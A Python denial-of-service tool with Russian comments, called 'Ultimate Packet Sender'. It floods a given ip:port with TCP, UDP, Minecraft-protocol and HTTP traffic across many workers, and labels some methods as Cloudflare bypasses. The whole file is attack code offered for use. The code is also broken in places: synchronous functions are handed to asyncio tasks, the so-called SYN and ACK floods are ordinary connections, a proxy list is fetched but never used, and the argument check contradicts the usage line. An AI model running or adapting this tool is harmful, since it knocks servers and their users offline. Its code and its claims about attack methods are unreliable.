import socket
import random
import time
import socks
import multiprocessing
import sys
import os
import threading
import signal
import requests
import asyncio
from colorama import Fore, Style
from itertools import cycle

# Прокси-серверы для ротации
PROXY_API_URL = "https://www.proxy-list.download/api/v1/get?type=socks5"

def get_proxies_from_api():
    """Получение списка прокси через API"""
    try:
        response = requests.get(PROXY_API_URL, timeout=5)
        proxies = response.text.split("\r\n")
        return proxies
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка при получении прокси: {e}{Style.RESET_ALL}")
        return []

def get_random_proxy(proxies):
    """Выбирает случайный прокси из списка"""
    return random.choice(proxies)

def animate(stop_event, target_ip, target_port, protocol, duration, workers):
    """Анимация загрузки с выводом информации об атаке."""
    time.sleep(5)  # Задержка перед началом анимации
    while not stop_event.is_set():
        sys.stdout.write(f"\r{Fore.CYAN}🚀 Атака выполняется на {Fore.YELLOW}{target_ip}:{target_port}{Fore.CYAN} | {protocol} | {duration}s | Мощность: {workers} потоков {random.choice(['🔥', '💥', '⚡', '🚀'])} {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

def send_tcp_syn(target_ip, target_port, duration):
    """TCP SYN Flood Attack"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((target_ip, target_port))
        packet = random._urandom(1024)  # Генерация случайных данных для пакета
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.sendto(packet, (target_ip, target_port))
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка TCP SYN: {e}{Style.RESET_ALL}")

def send_tcp_ack(target_ip, target_port, duration):
    """TCP ACK Flood Attack"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((target_ip, target_port))
        packet = random._urandom(1024)  # Генерация случайных данных для пакета
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.sendto(packet, (target_ip, target_port))
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка TCP ACK: {e}{Style.RESET_ALL}")

def send_udp_pps(target_ip, target_port, duration):
    """UDP Flood with High PPS"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
    sock.close()

def send_udp_china(target_ip, target_port, duration):
    """UDP Flood Targeting China Geoblocked Servers"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
    sock.close()

# Layer 7 Minecraft

def send_mc_ping(target_ip, target_port, duration):
    """Minecraft Ping Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        ping_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(ping_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка Minecraft Ping: {e}{Style.RESET_ALL}")

def send_mc_join(target_ip, target_port, duration):
    """Minecraft Join Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        join_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(join_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка Minecraft Join: {e}{Style.RESET_ALL}")

def send_mc_handshake(target_ip, target_port, duration):
    """Minecraft Handshake Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        handshake_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(handshake_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка Minecraft Handshake: {e}{Style.RESET_ALL}")

def send_mc_tcpbypass(target_ip, target_port, duration):
    """Minecraft TCP Bypass Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        tcp_packet = random._urandom(1024)
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(tcp_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка Minecraft TCP Bypass: {e}{Style.RESET_ALL}")

# Web Layer 7 (HTTP)

def send_http_out(target_ip, target_port, duration):
    """HTTP DDOS bypass method for Cloudflare"""
    try:
        url = f"http://{target_ip}:{target_port}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        end_time = time.time() + duration
        while time.time() < end_time:
            requests.get(url, headers=headers)
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка HTTP OUT: {e}{Style.RESET_ALL}")

def send_http_misc(target_ip, target_port, duration):
    """HTTP Miscellaneous bypass method for Cloudflare"""
    try:
        url = f"http://{target_ip}:{target_port}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        end_time = time.time() + duration
        while time.time() < end_time:
            requests.get(url, headers=headers)
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка HTTP MISC: {e}{Style.RESET_ALL}")

# Основная функция атаки
async def run_attack(target_ip, target_port, protocol, duration, workers, proxies):
    """Запуск атаки с ротацией прокси с использованием асинхронных функций."""
    stop_event = threading.Event()
    anim_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers), daemon=True)
    anim_thread.start()

    tasks = []
    for _ in range(workers):
        if protocol == "TCP-SYN":
            task = asyncio.create_task(send_tcp_syn(target_ip, target_port, duration))
        elif protocol == "TCP-ACK":
            task = asyncio.create_task(send_tcp_ack(target_ip, target_port, duration))
        elif protocol == "UDP-PPS":
            task = asyncio.create_task(send_udp_pps(target_ip, target_port, duration))
        elif protocol == "UDPCHINA":
            task = asyncio.create_task(send_udp_china(target_ip, target_port, duration))
        elif protocol == "MC-PING":
            task = asyncio.create_task(send_mc_ping(target_ip, target_port, duration))
        elif protocol == "MC-JOIN":
            task = asyncio.create_task(send_mc_join(target_ip, target_port, duration))
        elif protocol == "MC-HANDSHAKE":
            task = asyncio.create_task(send_mc_handshake(target_ip, target_port, duration))
        elif protocol == "MC-TCPBYPASS":
            task = asyncio.create_task(send_mc_tcpbypass(target_ip, target_port, duration))
        elif protocol == "HTTP-OUT":
            task = asyncio.create_task(send_http_out(target_ip, target_port, duration))
        elif protocol == "HTTP-MISC":
            task = asyncio.create_task(send_http_misc(target_ip, target_port, duration))
        else:
            print(f"{Fore.RED}🚨 Ошибка: неподдерживаемый протокол {protocol}{Style.RESET_ALL}")
            return
        tasks.append(task)

    await asyncio.gather(*tasks)

    stop_event.set()
    sys.stdout.write("\r")
    sys.stdout.flush()

def banner():
    """Вывод баннера"""
    print(f"{Fore.MAGENTA}==================================")
    print(f"🚀 {Fore.YELLOW}💣 Ultimate Packet Sender 💣 {Fore.MAGENTA}🚀")
    print(f"================================== {Style.RESET_ALL}")

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}❌ Атака прервана пользователем.{Style.RESET_ALL}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    banner()

    if len(sys.argv) != 5:
        print(f"{Fore.RED}⚠️ Использование: python z.py ip:port protocol time{Style.RESET_ALL}")
        sys.exit(1)

    target = sys.argv[1]
    protocol = sys.argv[2].upper()
    duration = int(sys.argv[3])
    workers = multiprocessing.cpu_count() * 2  # Использует в 2 раза больше потоков, чем ядер

    # Получаем список прокси с API
    proxies = get_proxies_from_api()

    if not proxies:
        print(f"{Fore.RED}❌ Прокси не найдены. Завершаем выполнение.{Style.RESET_ALL}")
        sys.exit(1)

    try:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
    except ValueError:
        print(f"{Fore.RED}🚨 Ошибка: неправильный формат ip:port{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.GREEN}💥 Атака началась на {target_ip}:{target_port} через {protocol} на {duration} секунд! 🔥{Style.RESET_ALL}")
    asyncio.run(run_attack(target_ip, target_port, protocol, duration, workers, proxies))
    print(f"{Fore.BLUE}✅ 🎯 Отправка пакетов завершена!{Style.RESET_ALL}")
